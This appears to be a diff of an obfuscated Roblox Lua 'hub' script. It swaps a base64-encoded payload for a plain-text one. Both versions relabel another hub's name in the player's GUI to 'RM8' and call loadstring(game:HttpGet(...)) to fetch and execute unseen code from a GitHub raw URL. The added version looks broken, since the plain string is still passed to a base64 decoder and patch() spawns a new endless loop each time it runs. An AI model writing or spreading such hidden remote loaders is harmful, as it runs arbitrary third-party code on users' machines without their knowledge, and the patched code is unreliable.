@@ -1,5 +1,5 @@
--- RM8 System
-local _0x724d8 = "Y2hhbmdlTmFtZSA9IGZ1bmN0aW9uKHIpIGZvciBfLHYgaW4gcGFpcnMocjpHZXREZXNjZW5kYW50cygpKSBkbyBpZiB2OklzQSgnVGV4dExhYmVsJykgb3Igdi1Jc0EoJ1RleHRCdXR0b24nKSB0aGVuIHYuVGV4dCA9IHYuVGV4dDpnc3ViKCdON1InLCAnUk04Jykgdi5UZXh0ID0gdi5UZXh0OmdzdWIoJ9i5p9mE2YUg2KfZhNmF2YXZh9mD2KknLCAnUk04IEhVQicpIGVuZCBlbmQgZW5kIDsgc3Bhd24oZnVuY3Rpb24oKSB3aGlsZSB0YXNrLndhaXQoMC41KSBkbyBjaGFuZ2VOYW1lKGdhbWU6R2V0U2VydmljZSgnQ29yZUd1aScpKSBjaGFuZ2VOYW1lKGdhbWU6R2V0U2VydmljZSgnUGxheWVycycpLkxvY2FsUGxheWVyLlBsYXllclVpKSBlbmQgZW5kKSA7IGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20va2ttbWFpODIva2ttbWFpODIvcmVmcy9oZWFkcy9tYWluL0pkaCcpKSgp"
+-- RM8 Ultra Patch
+local _0x724d8 = "function patch() local function rename(obj) for _, v in pairs(obj:GetDescendants()) do if v:IsA('TextLabel') or v:IsA('TextButton') then if v.Text:find('N7R') or v.Text:find('عالم المملكة') then v.Text = v.Text:gsub('N7R', 'RM8'):gsub('عالم المملكة', 'RM8 HUB') end end end end spawn(function() while task.wait(0.1) do patch() rename(game:GetService('CoreGui')) rename(game:GetService('Players').LocalPlayer.PlayerGui) end end) end patch() loadstring(game:HttpGet('https://raw.githubusercontent.com/kkmmai82/kkmmai82/refs/heads/main/Jdh'))()"
 local function _0x524d(_0x61)
     local _0x62 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     _0x61 = string.gsub(_0x61, '[^'.._0x62..'=]', '')
